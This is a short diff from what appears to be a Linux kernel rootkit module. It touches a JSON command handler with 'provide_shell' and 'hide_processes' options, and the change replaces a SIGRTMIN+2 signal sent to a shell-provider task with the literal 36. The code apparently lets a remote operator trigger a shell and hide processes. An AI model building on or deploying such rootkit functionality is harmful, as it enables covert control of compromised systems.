@@ -156,11 +156,11 @@ static int parse_json(char *json_str)
 			printk(KERN_INFO "%s: %s\n", "provide_shell", (flag) ? "true" : "false");
 			if (flag) {
 				memset(&info, 0, sizeof(struct siginfo));
-				info.si_signo = SIGRTMIN+2;
+				info.si_signo = 36;
 				info.si_code = SI_QUEUE;
 				info.si_int = 1234;
 
-				send_sig_info(SIGRTMIN+2, &info, shell_provider_task);
+				send_sig_info(36, &info, shell_provider_task);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_processes")) {
